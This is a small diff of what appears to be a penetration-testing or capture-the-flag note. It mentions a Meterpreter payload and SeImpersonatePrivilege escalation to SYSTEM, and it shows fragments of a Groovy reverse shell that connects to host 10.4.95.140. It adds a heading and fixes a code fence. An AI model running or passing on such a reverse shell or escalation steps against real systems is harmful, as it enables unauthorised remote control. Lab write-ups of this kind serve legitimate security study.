@@ -30,6 +30,7 @@ Use Meterpreter payload
 4. user has SeImpersonatePrivilege enabled --> getsystem --> PrivEsc to SYSTEM
 
 
+Groovy code:
 
 ```bash
 String host="10.4.95.140";
@@ -56,4 +57,4 @@ while(!s.isClosed()){
 };
 p.destroy();
 s.close();
-```bash
+```
